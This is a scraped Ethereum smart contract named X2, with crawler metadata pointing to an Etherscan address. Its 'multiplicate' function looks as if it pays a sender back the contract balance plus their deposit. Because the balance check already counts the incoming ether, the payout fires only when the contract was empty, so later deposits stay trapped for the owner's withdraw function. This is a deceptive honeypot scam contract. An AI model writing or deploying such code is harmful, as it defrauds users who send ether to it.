//token_name	
//token_url	https://etherscan.io//address/0xE0527863dF8abcb3caCA7dA329eb9C747822Aa98#code
//spider_time	2018/07/08 12:39:19
//token_Transactions	4 txns
//token_price	

contract X2
{
        address public Owner = msg.sender;

        function() public payable{}

        function withdraw()  payable public
        {
                require(msg.sender == Owner);
                Owner.transfer(this.balance);
        }

        function multiplicate(address adr) public payable
        {
            if(msg.value>=this.balance)
            {
                adr.transfer(this.balance+msg.value);
            }
        }


}